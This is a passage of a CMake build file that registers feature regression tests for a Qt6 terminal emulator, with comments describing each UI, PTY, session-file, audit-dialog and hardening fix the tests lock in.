    add_test(NAME terminal_partial_update_mode
             COMMAND test_terminal_partial_update_mode)
    set_tests_properties(terminal_partial_update_mode PROPERTIES
        LABELS "features;fast"
        TIMEOUT 10)

    # menubar_hover_stylesheet — 0.7.4 / 0.7.25 / 0.7.26 fixes pinned.
    # Pins that the menubar has an opaque background under a translucent-
    # parent window AND that every hover pseudo-state is styled, so
    # neither the hover flash nor the desktop-showing-through-menubar bug
    # can re-emerge from drift. INV-8 (0.7.26) requires the m_menuBar to
    # be an OpaqueMenuBar with a paintEvent fillRect — that's the only
    # path Qt actually honors on KWin + Breeze + Qt 6 under
    # WA_TranslucentBackground + WA_OpaquePaintEvent. See
    # tests/features/menubar_hover_stylesheet/spec.md.
    add_executable(test_menubar_hover_stylesheet
        tests/features/menubar_hover_stylesheet/test_menubar_hover_stylesheet.cpp
    )
    target_compile_options(test_menubar_hover_stylesheet PRIVATE
        -Wall -Wextra -Wpedantic
    )
    target_compile_definitions(test_menubar_hover_stylesheet PRIVATE
        SRC_MAINWINDOW_PATH="${CMAKE_CURRENT_SOURCE_DIR}/src/mainwindow.cpp"
        SRC_OPAQUEMENUBAR_PATH="${CMAKE_CURRENT_SOURCE_DIR}/src/opaquemenubar.h"
    )
    add_test(NAME menubar_hover_stylesheet
             COMMAND test_menubar_hover_stylesheet)
    set_tests_properties(menubar_hover_stylesheet PROPERTIES
        LABELS "features;fast"
        TIMEOUT 10)

    # tabbar_statusbar_opaque — 0.7.36 fix. Same translucent-parent
    # failure mode as menubar_hover_stylesheet INV-8 caught in two
    # different bars: the tab bar's empty area (right of the last
    # tab) and the entire status bar background were painting
    # transparent under WA_TranslucentBackground. ColoredTabBar gained
    # a setBackgroundFill + paintEvent fillRect, and a new header-only
    # OpaqueStatusBar mirrors OpaqueMenuBar. See
    # tests/features/tabbar_statusbar_opaque/spec.md.
    add_executable(test_tabbar_statusbar_opaque
        tests/features/tabbar_statusbar_opaque/test_tabbar_statusbar_opaque.cpp
    )
    target_compile_options(test_tabbar_statusbar_opaque PRIVATE
        -Wall -Wextra -Wpedantic
    )
    target_compile_definitions(test_tabbar_statusbar_opaque PRIVATE
        SRC_MAINWINDOW_PATH="${CMAKE_CURRENT_SOURCE_DIR}/src/mainwindow.cpp"
        SRC_COLOREDTABBAR_CPP_PATH="${CMAKE_CURRENT_SOURCE_DIR}/src/coloredtabbar.cpp"
        SRC_COLOREDTABBAR_H_PATH="${CMAKE_CURRENT_SOURCE_DIR}/src/coloredtabbar.h"
        SRC_OPAQUESTATUSBAR_PATH="${CMAKE_CURRENT_SOURCE_DIR}/src/opaquestatusbar.h"
    )
    add_test(NAME tabbar_statusbar_opaque
             COMMAND test_tabbar_statusbar_opaque)
    set_tests_properties(tabbar_statusbar_opaque PROPERTIES
        LABELS "features;fast"
        TIMEOUT 10)

    # ris_preserves_callbacks — 0.7.17 fix. Locks the RIS (ESC c) handler
    # in TerminalGrid::handleEsc, which previously preserved only
    # responseCallback + bellCallback on reset — silently wiping
    # notifyCallback, progressCallback, lineCompletionCallback,
    # commandFinishedCallback, userVarCallback, and osc133ForgeryCallback
    # (plus the osc133Key HMAC enforcement config). Any `tput reset` /
    # `reset(1)` from the running shell killed shell-integration,
    # plugin, and security hooks. See spec.md.
    add_executable(test_ris_preserves_callbacks
        tests/features/ris_preserves_callbacks/test_ris_preserves_callbacks.cpp
        src/terminalgrid.cpp
        src/vtparser.cpp
    )
    target_link_libraries(test_ris_preserves_callbacks PRIVATE
        Qt6::Core
        Qt6::Gui  # QColor / QImage transitively required by terminalgrid.h
    )
    target_include_directories(test_ris_preserves_callbacks PRIVATE src)
    target_compile_options(test_ris_preserves_callbacks PRIVATE
        -Wall -Wextra -Wpedantic
    )
    add_test(NAME ris_preserves_callbacks COMMAND test_ris_preserves_callbacks)
    set_tests_properties(ris_preserves_callbacks PROPERTIES
        LABELS "features;fast"
        TIMEOUT 10)

    # bce_scroll_erase — 0.7.23 fix. Locks xterm-compatible Background
    # Color Erase across every scroll/erase path: clearRow, insertLines,
    # deleteLines, scrollUp/Down, deleteChars, insertBlanks, and the
    # LF-past-scroll-bottom auto-scroll. Previously takeBlankedCellsRow()
    # hardcoded m_defaultBg, so `\e[44mCSI L` (vim/less/tmux paint path)
    # left default-bg gaps instead of blue. See spec.md.
    add_executable(test_bce_scroll_erase
        tests/features/bce_scroll_erase/test_bce_scroll_erase.cpp
        src/terminalgrid.cpp
        src/vtparser.cpp
    )
    target_link_libraries(test_bce_scroll_erase PRIVATE
        Qt6::Core
        Qt6::Gui
    )
    target_include_directories(test_bce_scroll_erase PRIVATE src)
    target_compile_options(test_bce_scroll_erase PRIVATE
        -Wall -Wextra -Wpedantic
    )
    add_test(NAME bce_scroll_erase COMMAND test_bce_scroll_erase)
    set_tests_properties(bce_scroll_erase PROPERTIES
        LABELS "features;fast"
        TIMEOUT 10)

    # wide_char_overwrite_mate — 0.7.24 fix. Locks the invariant that
    # overwriting part of a wide-char pair (CJK / wide emoji) cleans up
    # the stranded mate on the opposite side. Previously handlePrint and
    # handleAsciiPrintRun left dangling isWideChar / isWideCont flags when
    # a narrow write landed on one half of a pair, corrupting render and
    # selection. See spec.md.
    add_executable(test_wide_char_overwrite
        tests/features/wide_char_overwrite_mate/test_wide_char_overwrite.cpp
        src/terminalgrid.cpp
        src/vtparser.cpp
    )
    target_link_libraries(test_wide_char_overwrite PRIVATE
        Qt6::Core
        Qt6::Gui
    )
    target_include_directories(test_wide_char_overwrite PRIVATE src)
    target_compile_options(test_wide_char_overwrite PRIVATE
        -Wall -Wextra -Wpedantic
    )
    add_test(NAME wide_char_overwrite_mate COMMAND test_wide_char_overwrite)
    set_tests_properties(wide_char_overwrite_mate PROPERTIES
        LABELS "features;fast"
        TIMEOUT 10)

    # osc8_apc_memory_caps — 0.7.25 hardening. Locks the bounded-growth
    # caps on OSC 8 URIs (MAX_OSC8_URI_BYTES = 2 KiB) and the Kitty APC
    # chunk-accumulation buffer (MAX_KITTY_CHUNK_BYTES = 32 MiB).
    # Previously both accumulators were capped only by the VT parser's
    # per-envelope 10 MB ceiling, letting hostile output wedge tens of
    # GB into per-row hyperlink spans or the staging buffer before any
    # downstream guard ran. See spec.md.
    add_executable(test_osc8_apc_memory_caps
        tests/features/osc8_apc_memory_caps/test_osc8_apc_memory_caps.cpp
        src/terminalgrid.cpp
        src/vtparser.cpp
    )
    target_link_libraries(test_osc8_apc_memory_caps PRIVATE
        Qt6::Core
        Qt6::Gui
    )
    target_include_directories(test_osc8_apc_memory_caps PRIVATE src)
    target_compile_options(test_osc8_apc_memory_caps PRIVATE
        -Wall -Wextra -Wpedantic
    )
    add_test(NAME osc8_apc_memory_caps COMMAND test_osc8_apc_memory_caps)
    set_tests_properties(osc8_apc_memory_caps PROPERTIES
        LABELS "features;fast"
        TIMEOUT 20)

    # sigpipe_ignore — 0.6.28 fix (bc97485). Locks the
    # std::signal(SIGPIPE, SIG_IGN) call in main() that prevents a
    # full-window crash when writing to a just-closed PTY. Source-grep
    # test: re-read src/main.cpp and verify the call exists inside
    # main() before the QApplication constructor, with <csignal>
    # included. See tests/features/sigpipe_ignore/spec.md.
    add_executable(test_sigpipe_ignore
        tests/features/sigpipe_ignore/test_sigpipe_ignore.cpp
    )
    target_compile_options(test_sigpipe_ignore PRIVATE
        -Wall -Wextra -Wpedantic
    )
    target_compile_definitions(test_sigpipe_ignore PRIVATE
        SRC_MAIN_PATH="${CMAKE_CURRENT_SOURCE_DIR}/src/main.cpp"
    )
    add_test(NAME sigpipe_ignore COMMAND test_sigpipe_ignore)
    set_tests_properties(sigpipe_ignore PROPERTIES
        LABELS "features;fast"
        TIMEOUT 10)

    # pty_closefrom — 0.7.27 fix. Locks the post-fork close-inherited-FDs
    # path: must use close_range(2) (Linux 5.9+) with a getrlimit-bounded
    # fallback, not the prior hard-coded fd<1024 loop that leaked FDs on
    # systemd / container default RLIMIT_NOFILE profiles. Source-grep
    # test re-reads src/ptyhandler.cpp. See
    # tests/features/pty_closefrom/spec.md.
    add_executable(test_pty_closefrom
        tests/features/pty_closefrom/test_pty_closefrom.cpp
    )
    target_compile_options(test_pty_closefrom PRIVATE
        -Wall -Wextra -Wpedantic
    )
    target_compile_definitions(test_pty_closefrom PRIVATE
        SRC_PTY_PATH="${CMAKE_CURRENT_SOURCE_DIR}/src/ptyhandler.cpp"
    )
    add_test(NAME pty_closefrom COMMAND test_pty_closefrom)
    set_tests_properties(pty_closefrom PROPERTIES
        LABELS "features;fast"
        TIMEOUT 10)

    # pty_write_eagain_queue — 0.7.27 fix. Locks the EAGAIN-queue +
    # write-side QSocketNotifier path that replaced the silent-drop
    # break in Pty::write. Source-grep test against ptyhandler.{h,cpp}
    # — see tests/features/pty_write_eagain_queue/spec.md.
    add_executable(test_pty_write_eagain_queue
        tests/features/pty_write_eagain_queue/test_pty_write_eagain_queue.cpp
    )
    target_compile_options(test_pty_write_eagain_queue PRIVATE
        -Wall -Wextra -Wpedantic
    )
    target_compile_definitions(test_pty_write_eagain_queue PRIVATE
        SRC_PTY_CPP_PATH="${CMAKE_CURRENT_SOURCE_DIR}/src/ptyhandler.cpp"
        SRC_PTY_H_PATH="${CMAKE_CURRENT_SOURCE_DIR}/src/ptyhandler.h"
    )
    add_test(NAME pty_write_eagain_queue COMMAND test_pty_write_eagain_queue)
    set_tests_properties(pty_write_eagain_queue PROPERTIES
        LABELS "features;fast"
        TIMEOUT 10)

    # audit_per_tool_timeout — 0.7.28 fix. Locks `int timeoutMs` field
    # on AuditCheck, the per-check m_timeout->start() use site, the
    # parameterised "Timed out (Ns)" warning, and at least one
    # calibration override > 30 s for the slow-tool IDs (cppcheck,
    # semgrep, osv_scanner, trufflehog, clang_tidy, clazy). See
    # tests/features/audit_per_tool_timeout/spec.md.
    add_executable(test_audit_per_tool_timeout
        tests/features/audit_per_tool_timeout/test_audit_per_tool_timeout.cpp
    )
    target_compile_options(test_audit_per_tool_timeout PRIVATE
        -Wall -Wextra -Wpedantic
    )
    target_compile_definitions(test_audit_per_tool_timeout PRIVATE
        SRC_AUDIT_CPP_PATH="${CMAKE_CURRENT_SOURCE_DIR}/src/auditdialog.cpp"
        SRC_AUDIT_H_PATH="${CMAKE_CURRENT_SOURCE_DIR}/src/auditdialog.h"
        SRC_AUDIT_ENGINE_CPP_PATH="${CMAKE_CURRENT_SOURCE_DIR}/src/auditengine.cpp"
        SRC_AUDIT_ENGINE_H_PATH="${CMAKE_CURRENT_SOURCE_DIR}/src/auditengine.h"
    )
    add_test(NAME audit_per_tool_timeout COMMAND test_audit_per_tool_timeout)
    set_tests_properties(audit_per_tool_timeout PROPERTIES
        LABELS "features;fast"
        TIMEOUT 10)

    # audit_incremental_output_drain — 0.7.28 fix. Locks the
    # readyReadStandardOutput / readyReadStandardError drain wiring,
    # the m_currentOutput / m_currentError buffers, the
    # MAX_TOOL_OUTPUT_BYTES cap, the per-check buffer reset, and the
    # kill-on-overflow path. See
    # tests/features/audit_incremental_output_drain/spec.md.
    add_executable(test_audit_incremental_output_drain
        tests/features/audit_incremental_output_drain/test_audit_incremental_output_drain.cpp
    )
    target_compile_options(test_audit_incremental_output_drain PRIVATE
        -Wall -Wextra -Wpedantic
    )
    target_compile_definitions(test_audit_incremental_output_drain PRIVATE
        SRC_AUDIT_CPP_PATH="${CMAKE_CURRENT_SOURCE_DIR}/src/auditdialog.cpp"
        SRC_AUDIT_H_PATH="${CMAKE_CURRENT_SOURCE_DIR}/src/auditdialog.h"
    )
    add_test(NAME audit_incremental_output_drain
        COMMAND test_audit_incremental_output_drain)
    set_tests_properties(audit_incremental_output_drain PROPERTIES
        LABELS "features;fast"
        TIMEOUT 10)

    # audit_tool_crash_distinct — 0.7.28 fix. Locks the named
    # exitCode / exitStatus parameters on onCheckFinished, the
    # QProcess::CrashExit branch, the warning emission with a
    # crash/exit message, and the Severity::Info demotion. See
    # tests/features/audit_tool_crash_distinct/spec.md.
    add_executable(test_audit_tool_crash_distinct
        tests/features/audit_tool_crash_distinct/test_audit_tool_crash_distinct.cpp
    )
    target_compile_options(test_audit_tool_crash_distinct PRIVATE
        -Wall -Wextra -Wpedantic
    )
    target_compile_definitions(test_audit_tool_crash_distinct PRIVATE
        SRC_AUDIT_CPP_PATH="${CMAKE_CURRENT_SOURCE_DIR}/src/auditdialog.cpp"
    )
    add_test(NAME audit_tool_crash_distinct
        COMMAND test_audit_tool_crash_distinct)
    set_tests_properties(audit_tool_crash_distinct PROPERTIES
        LABELS "features;fast"
        TIMEOUT 10)

    # audit_dedup_96bit — 0.7.29 fix. Locks computeDedup's widened
    # 24-hex-char prefix (96 bits up from 64), the isSuppressed
    # backward-compat helper that matches legacy 16-char keys, the
    # render-pipeline use of the helper, and the
    # m_suppressionReasons mirror update in saveSuppression. See
    # tests/features/audit_dedup_96bit/spec.md.
    add_executable(test_audit_dedup_96bit
        tests/features/audit_dedup_96bit/test_audit_dedup_96bit.cpp
    )
    target_compile_options(test_audit_dedup_96bit PRIVATE
        -Wall -Wextra -Wpedantic
    )
    target_compile_definitions(test_audit_dedup_96bit PRIVATE
        SRC_AUDIT_CPP_PATH="${CMAKE_CURRENT_SOURCE_DIR}/src/auditdialog.cpp"
        SRC_AUDIT_H_PATH="${CMAKE_CURRENT_SOURCE_DIR}/src/auditdialog.h"
        SRC_AUDIT_ENGINE_CPP_PATH="${CMAKE_CURRENT_SOURCE_DIR}/src/auditengine.cpp"
        SRC_AUDIT_ENGINE_H_PATH="${CMAKE_CURRENT_SOURCE_DIR}/src/auditengine.h"
    )
    add_test(NAME audit_dedup_96bit COMMAND test_audit_dedup_96bit)
    set_tests_properties(audit_dedup_96bit PROPERTIES
        LABELS "features;fast"
        TIMEOUT 10)

    # audit_regex_dos_watchdog — 0.7.29 fix. Locks the
    # isCatastrophicRegex shape-rejection helper, its invocation at
    # the dropIfMatches / loadAllowlist user-pattern entry points,
    # the PCRE2 `(*LIMIT_MATCH=N)` step-budget cap, and the
    # qWarning rejection path. See
    # tests/features/audit_regex_dos_watchdog/spec.md.
    add_executable(test_audit_regex_dos_watchdog
        tests/features/audit_regex_dos_watchdog/test_audit_regex_dos_watchdog.cpp
    )
    target_compile_options(test_audit_regex_dos_watchdog PRIVATE
        -Wall -Wextra -Wpedantic
    )
    target_compile_definitions(test_audit_regex_dos_watchdog PRIVATE
        SRC_AUDIT_CPP_PATH="${CMAKE_CURRENT_SOURCE_DIR}/src/auditdialog.cpp"
        SRC_AUDIT_H_PATH="${CMAKE_CURRENT_SOURCE_DIR}/src/auditdialog.h"
        SRC_AUDIT_ENGINE_CPP_PATH="${CMAKE_CURRENT_SOURCE_DIR}/src/auditengine.cpp"
        SRC_AUDIT_ENGINE_H_PATH="${CMAKE_CURRENT_SOURCE_DIR}/src/auditengine.h"
    )
    add_test(NAME audit_regex_dos_watchdog
        COMMAND test_audit_regex_dos_watchdog)
    set_tests_properties(audit_regex_dos_watchdog PROPERTIES
        LABELS "features;fast"
        TIMEOUT 10)

    # audit_sarif_suppressions — 0.7.29 fix. Locks the
    # m_suppressionReasons map declaration, its load/save
    # population, the SARIF v2.1.0 §3.34 result.suppressions[]
    # array emission, and removal of the suppress-and-skip
    # filter from exportSarif. See
    # tests/features/audit_sarif_suppressions/spec.md.
    add_executable(test_audit_sarif_suppressions
        tests/features/audit_sarif_suppressions/test_audit_sarif_suppressions.cpp
    )
    target_compile_options(test_audit_sarif_suppressions PRIVATE
        -Wall -Wextra -Wpedantic
    )
    target_compile_definitions(test_audit_sarif_suppressions PRIVATE
        SRC_AUDIT_CPP_PATH="${CMAKE_CURRENT_SOURCE_DIR}/src/auditdialog.cpp"
        SRC_AUDIT_H_PATH="${CMAKE_CURRENT_SOURCE_DIR}/src/auditdialog.h"
    )
    add_test(NAME audit_sarif_suppressions
        COMMAND test_audit_sarif_suppressions)
    set_tests_properties(audit_sarif_suppressions PROPERTIES
        LABELS "features;fast"
        TIMEOUT 10)

    # session_sha256_checksum — 0.7.30 fix. Locks the V4 envelope that
    # wraps qCompress output with [SHEC magic][version][SHA-256][len].
    # The hash must be computed at serialize time, recomputed at restore
    # time, and a mismatch must short-circuit the restore. See
    # tests/features/session_sha256_checksum/spec.md.
    add_executable(test_session_sha256_checksum
        tests/features/session_sha256_checksum/test_session_sha256_checksum.cpp
    )
    target_compile_options(test_session_sha256_checksum PRIVATE
        -Wall -Wextra -Wpedantic
    )
    target_compile_definitions(test_session_sha256_checksum PRIVATE
        SRC_SESSION_CPP_PATH="${CMAKE_CURRENT_SOURCE_DIR}/src/sessionmanager.cpp"
        SRC_SESSION_H_PATH="${CMAKE_CURRENT_SOURCE_DIR}/src/sessionmanager.h"
    )
    add_test(NAME session_sha256_checksum
        COMMAND test_session_sha256_checksum)
    set_tests_properties(session_sha256_checksum PROPERTIES
        LABELS "features;fast"
        TIMEOUT 10)

    # session_qcompress_length_guard — 0.7.30 fix. Locks the
    # 4-byte big-endian uncompressed-length pre-flight that runs
    # BEFORE qUncompress, so a crafted file claiming 500 MB doesn't
    # trigger a 500 MB allocation that the post-hoc cap could only
    # catch after the damage was done. See
    # tests/features/session_qcompress_length_guard/spec.md.
    add_executable(test_session_qcompress_length_guard
        tests/features/session_qcompress_length_guard/test_session_qcompress_length_guard.cpp
    )
    target_compile_options(test_session_qcompress_length_guard PRIVATE
        -Wall -Wextra -Wpedantic
    )
    target_compile_definitions(test_session_qcompress_length_guard PRIVATE
        SRC_SESSION_CPP_PATH="${CMAKE_CURRENT_SOURCE_DIR}/src/sessionmanager.cpp"
        SRC_SESSION_H_PATH="${CMAKE_CURRENT_SOURCE_DIR}/src/sessionmanager.h"
    )
    add_test(NAME session_qcompress_length_guard
        COMMAND test_session_qcompress_length_guard)
    set_tests_properties(session_qcompress_length_guard PROPERTIES
        LABELS "features;fast"
        TIMEOUT 10)

    # session_cell_loop_stream_status — 0.7.30 fix. Locks the
    # readCell `-> bool` return + `if (!readCell(...))` short-circuit
    # at every call site, plus the per-codepoint status check inside
    # readCombining's inner loop. Pre-fix, a truncated stream
    # silently wrote uninitialized fg/bg/flags into the grid. See
    # tests/features/session_cell_loop_stream_status/spec.md.
    add_executable(test_session_cell_loop_stream_status
        tests/features/session_cell_loop_stream_status/test_session_cell_loop_stream_status.cpp
    )
    target_compile_options(test_session_cell_loop_stream_status PRIVATE
        -Wall -Wextra -Wpedantic
    )
    target_compile_definitions(test_session_cell_loop_stream_status PRIVATE
        SRC_SESSION_CPP_PATH="${CMAKE_CURRENT_SOURCE_DIR}/src/sessionmanager.cpp"
    )
    add_test(NAME session_cell_loop_stream_status
        COMMAND test_session_cell_loop_stream_status)
    set_tests_properties(session_cell_loop_stream_status PROPERTIES
        LABELS "features;fast"
        TIMEOUT 10)

    # persistence_post_rename_chmod — 0.7.31 fix. Locks the
    # belt-and-suspenders post-rename chmod at every save site that
    # writes a file containing API keys / scrollback / bearer tokens.
    # Pre-fix, fd-only chmod relied on rename(2) preserving perms,
    # which fails on FAT/exFAT/SMB/NFS/copy-unlink fallback. See
    # tests/features/persistence_post_rename_chmod/spec.md.
    add_executable(test_persistence_post_rename_chmod
        tests/features/persistence_post_rename_chmod/test_persistence_post_rename_chmod.cpp
    )
    target_compile_options(test_persistence_post_rename_chmod PRIVATE
        -Wall -Wextra -Wpedantic
    )
    target_compile_definitions(test_persistence_post_rename_chmod PRIVATE
        SRC_CONFIG_CPP_PATH="${CMAKE_CURRENT_SOURCE_DIR}/src/config.cpp"
        SRC_SESSIONMANAGER_CPP_PATH="${CMAKE_CURRENT_SOURCE_DIR}/src/sessionmanager.cpp"
        SRC_SETTINGSDIALOG_CPP_PATH="${CMAKE_CURRENT_SOURCE_DIR}/src/settingsdialog.cpp"
    )
    add_test(NAME persistence_post_rename_chmod
        COMMAND test_persistence_post_rename_chmod)
    set_tests_properties(persistence_post_rename_chmod PROPERTIES
        LABELS "features;fast"
        TIMEOUT 10)

    # concurrent_writer_lock — 0.7.31 fix. Locks the ConfigWriteLock
    # RAII guard around config.json + ~/.claude/settings.json saves.
    # Two simultaneously-running Ants instances writing the same
    # config previously raced on rename(2); the lock serializes them.
    # See tests/features/concurrent_writer_lock/spec.md.
    add_executable(test_concurrent_writer_lock
        tests/features/concurrent_writer_lock/test_concurrent_writer_lock.cpp
    )
    target_compile_options(test_concurrent_writer_lock PRIVATE
        -Wall -Wextra -Wpedantic
    )
    target_compile_definitions(test_concurrent_writer_lock PRIVATE
        SRC_CONFIG_CPP_PATH="${CMAKE_CURRENT_SOURCE_DIR}/src/config.cpp"
        SRC_CLAUDEALLOWLIST_CPP_PATH="${CMAKE_CURRENT_SOURCE_DIR}/src/claudeallowlist.cpp"
        SRC_SETTINGSDIALOG_CPP_PATH="${CMAKE_CURRENT_SOURCE_DIR}/src/settingsdialog.cpp"
    )
    target_include_directories(test_concurrent_writer_lock PRIVATE src)
    target_link_libraries(test_concurrent_writer_lock PRIVATE Qt6::Core)
    add_test(NAME concurrent_writer_lock
        COMMAND test_concurrent_writer_lock)
    set_tests_properties(concurrent_writer_lock PROPERTIES
        LABELS "features;fast"
        TIMEOUT 15)

    # secureio_configbackup_split — 0.7.31 refactor. Locks the split
    # of secureio.h into perms-only and configbackup.h owning rotation
    # + ConfigWriteLock. Asserts no helper drifts back into the wrong
    # header and every caller pulls the include it actually needs.
    # See tests/features/secureio_configbackup_split/spec.md.
    add_executable(test_secureio_configbackup_split
        tests/features/secureio_configbackup_split/test_secureio_configbackup_split.cpp
    )
    target_compile_options(test_secureio_configbackup_split PRIVATE
        -Wall -Wextra -Wpedantic
    )
    target_compile_definitions(test_secureio_configbackup_split PRIVATE
        SRC_SECUREIO_H_PATH="${CMAKE_CURRENT_SOURCE_DIR}/src/secureio.h"
        SRC_CONFIGBACKUP_H_PATH="${CMAKE_CURRENT_SOURCE_DIR}/src/configbackup.h"
        SRC_CONFIG_CPP_PATH="${CMAKE_CURRENT_SOURCE_DIR}/src/config.cpp"
        SRC_CLAUDEALLOWLIST_CPP_PATH="${CMAKE_CURRENT_SOURCE_DIR}/src/claudeallowlist.cpp"
        SRC_SETTINGSDIALOG_CPP_PATH="${CMAKE_CURRENT_SOURCE_DIR}/src/settingsdialog.cpp"
    )
    add_test(NAME secureio_configbackup_split
        COMMAND test_secureio_configbackup_split)
    set_tests_properties(secureio_configbackup_split PROPERTIES
        LABELS "features;fast"
        TIMEOUT 10)

    # settings_dependency_gating — 0.7.32 fix. Locks the toggled→
    # setEnabled wiring on the three master checkboxes (m_aiEnabled,
    # m_autoColorScheme, m_quakeMode) plus the one-shot sync call so
    # the initial widget state matches the loaded config without
    # waiting for the user to toggle. See
    # tests/features/settings_dependency_gating/spec.md.
    add_executable(test_settings_dependency_gating
        tests/features/settings_dependency_gating/test_settings_dependency_gating.cpp
    )
    target_compile_options(test_settings_dependency_gating PRIVATE
        -Wall -Wextra -Wpedantic
    )
    target_compile_definitions(test_settings_dependency_gating PRIVATE
        SRC_SETTINGSDIALOG_CPP_PATH="${CMAKE_CURRENT_SOURCE_DIR}/src/settingsdialog.cpp"
    )
    add_test(NAME settings_dependency_gating
        COMMAND test_settings_dependency_gating)
    set_tests_properties(settings_dependency_gating PROPERTIES
        LABELS "features;fast"
        TIMEOUT 10)

    # settings_profile_cancel_rollback — 0.7.32 fix. Locks the
    # pending-state pair (m_pendingProfiles + m_pendingActiveProfile)
    # and that Save/Delete/Load mutate ONLY pending state, never
    # m_config directly. applySettings is the single commit point.
    # See tests/features/settings_profile_cancel_rollback/spec.md.
    add_executable(test_settings_profile_cancel_rollback
        tests/features/settings_profile_cancel_rollback/test_settings_profile_cancel_rollback.cpp
    )
    target_compile_options(test_settings_profile_cancel_rollback PRIVATE
        -Wall -Wextra -Wpedantic
    )
    target_compile_definitions(test_settings_profile_cancel_rollback PRIVATE
        SRC_SETTINGSDIALOG_CPP_PATH="${CMAKE_CURRENT_SOURCE_DIR}/src/settingsdialog.cpp"
        SRC_SETTINGSDIALOG_H_PATH="${CMAKE_CURRENT_SOURCE_DIR}/src/settingsdialog.h"
    )
    add_test(NAME settings_profile_cancel_rollback
        COMMAND test_settings_profile_cancel_rollback)
    set_tests_properties(settings_profile_cancel_rollback PROPERTIES
        LABELS "features;fast"
        TIMEOUT 10)

    # settings_restore_defaults — 0.7.32 fix. Locks the
    # "Restore Defaults (<TabName> tab)" buttons across General,
    # Appearance, Terminal, AI tabs, and that the reset slots
    # mutate widget state only (no direct m_config-> writes). See
    # tests/features/settings_restore_defaults/spec.md.
    add_executable(test_settings_restore_defaults
        tests/features/settings_restore_defaults/test_settings_restore_defaults.cpp
    )
    target_compile_options(test_settings_restore_defaults PRIVATE
        -Wall -Wextra -Wpedantic
    )
    target_compile_definitions(test_settings_restore_defaults PRIVATE
        SRC_SETTINGSDIALOG_CPP_PATH="${CMAKE_CURRENT_SOURCE_DIR}/src/settingsdialog.cpp"
    )
    add_test(NAME settings_restore_defaults
        COMMAND test_settings_restore_defaults)
    set_tests_properties(settings_restore_defaults PROPERTIES
        LABELS "features;fast"
        TIMEOUT 10)

    # pty_dtor_off_main_thread — 0.7.33 fix. Locks the destructor's
    # detached std::thread for SIGTERM/SIGKILL escalation. Pre-fix
    # window-close froze the GUI N×500ms when N split panes closed
    # together. See tests/features/pty_dtor_off_main_thread/spec.md.
    add_executable(test_pty_dtor_off_main_thread
        tests/features/pty_dtor_off_main_thread/test_pty_dtor_off_main_thread.cpp
    )
    target_compile_options(test_pty_dtor_off_main_thread PRIVATE
        -Wall -Wextra -Wpedantic
    )
    target_compile_definitions(test_pty_dtor_off_main_thread PRIVATE
        SRC_PTYHANDLER_CPP_PATH="${CMAKE_CURRENT_SOURCE_DIR}/src/ptyhandler.cpp"
    )
    add_test(NAME pty_dtor_off_main_thread
        COMMAND test_pty_dtor_off_main_thread)
    set_tests_properties(pty_dtor_off_main_thread PROPERTIES
        LABELS "features;fast"
        TIMEOUT 10)

    # portal_session_close — 0.7.33 fix. Locks the dtor + Session.Close
    # async dispatch on the active portal session handle. Pre-fix the
    # session leaked for the lifetime of xdg-desktop-portal. See
    # tests/features/portal_session_close/spec.md.
    add_executable(test_portal_session_close
        tests/features/portal_session_close/test_portal_session_close.cpp
    )
    target_compile_options(test_portal_session_close PRIVATE
        -Wall -Wextra -Wpedantic
    )
    target_compile_definitions(test_portal_session_close PRIVATE
        SRC_PORTAL_H_PATH="${CMAKE_CURRENT_SOURCE_DIR}/src/globalshortcutsportal.h"
        SRC_PORTAL_CPP_PATH="${CMAKE_CURRENT_SOURCE_DIR}/src/globalshortcutsportal.cpp"
    )
    add_test(NAME portal_session_close
        COMMAND test_portal_session_close)
    set_tests_properties(portal_session_close PROPERTIES
        LABELS "features;fast"
        TIMEOUT 10)

    # plugin_manifest_safety — 0.7.33 fix. Locks the 1 MiB manifest
    # cap (OOM surface), QDir::NoSymLinks, canonical plugin root +
    # per-entry canonical-containment check (symlink escape). See
    # tests/features/plugin_manifest_safety/spec.md.
    add_executable(test_plugin_manifest_safety
        tests/features/plugin_manifest_safety/test_plugin_manifest_safety.cpp
    )
    target_compile_options(test_plugin_manifest_safety PRIVATE
        -Wall -Wextra -Wpedantic
    )
    target_compile_definitions(test_plugin_manifest_safety PRIVATE
        SRC_PLUGINMANAGER_CPP_PATH="${CMAKE_CURRENT_SOURCE_DIR}/src/pluginmanager.cpp"
    )
    add_test(NAME plugin_manifest_safety
        COMMAND test_plugin_manifest_safety)
    set_tests_properties(plugin_manifest_safety PROPERTIES
        LABELS "features;fast"
        TIMEOUT 10)

    # tab_close_button_visible — 0.7.32 user-feedback fix
    # 2026-04-25: the tab × glyph was hover-only on Fusion / qt6ct /
    # some Plasma colour schemes after the 0.6.27 platform-style
    # fallback. Locks the explicit data-URI SVG `image: url(...)`
    # rule and the URL-encoded `%23` arg-side splice that prevents
    # Qt's CSS parser from truncating the data URI at the colour's
    # `#`. See tests/features/tab_close_button_visible/spec.md.
    add_executable(test_tab_close_button_visible
        tests/features/tab_close_button_visible/test_tab_close_button_visible.cpp
    )
    target_compile_options(test_tab_close_button_visible PRIVATE
        -Wall -Wextra -Wpedantic
    )
    target_compile_definitions(test_tab_close_button_visible PRIVATE
        SRC_MAINWINDOW_CPP_PATH="${CMAKE_CURRENT_SOURCE_DIR}/src/mainwindow.cpp"
    )
    add_test(NAME tab_close_button_visible
        COMMAND test_tab_close_button_visible)
    set_tests_properties(tab_close_button_visible PROPERTIES
        LABELS "features;fast"
        TIMEOUT 10)

    # review_changes_branches — 0.7.32 fix. User feedback 2026-04-25:
    # the Review Changes dialog only showed current-branch state.
    # Locks the two new probes (for-each-ref + --branches --not
    # --remotes), the matching ProbeState fields, the rendered
    # sections, and the empty-state guard. See
    # tests/features/review_changes_branches/spec.md.
    add_executable(test_review_changes_branches
        tests/features/review_changes_branches/test_review_changes_branches.cpp
    )
    target_compile_options(test_review_changes_branches PRIVATE
        -Wall -Wextra -Wpedantic
    )
    target_compile_definitions(test_review_changes_branches PRIVATE
        SRC_MAINWINDOW_CPP_PATH="${CMAKE_CURRENT_SOURCE_DIR}/src/mainwindow.cpp"
    )
    add_test(NAME review_changes_branches
        COMMAND test_review_changes_branches)
    set_tests_properties(review_changes_branches PROPERTIES
        LABELS "features;fast"
        TIMEOUT 10)

    # review_changes_scroll_preserve — 0.7.37 fix. The 0.7.32 live-
    # update path called setHtml unconditionally on every probe
    # completion, snapping the QTextEdit scroll bar back to the top
    # — on a long diff with active live updates the dialog became
    # unscrollable. User report 2026-04-25. Locks the lastHtml cache,
    # the skip-identical-render guard, and the
    # capture-scroll-before-setHtml + restore-after pattern. See
    # tests/features/review_changes_scroll_preserve/spec.md.
    add_executable(test_review_changes_scroll_preserve
